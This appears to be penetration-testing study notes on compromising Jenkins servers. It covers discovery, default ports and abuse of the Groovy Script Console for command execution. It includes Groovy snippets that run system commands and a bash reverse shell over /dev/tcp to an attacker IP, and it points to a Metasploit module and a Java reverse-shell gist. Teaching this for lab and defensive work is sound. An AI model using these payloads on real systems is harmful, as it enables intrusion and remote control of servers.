


Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat

# Discovery/Footprinting
    
Jenkins  is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.


# Enumeration

    
The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.


# Script Console Exploitation

Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console. 
The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime.
This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.


Code: groovy
```                        
    def cmd = 'id'
    def sout = new StringBuffer(), serr = new StringBuffer()
    def proc = cmd.execute()
    proc.consumeProcessOutput(sout, serr)
    proc.waitForOrKill(1000)
    println sout
```
There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or exploit/multi/http/jenkins_script_console Metasploit module.

Code: groovy
```
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
```
Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. We could run commands on a Windows-based Jenkins install using this snippet:

    Code: groovy
```
    def cmd = "cmd.exe /c dir".execute();
    println("${cmd.text}");
```

We could also use this (  https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy  ) Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port.

    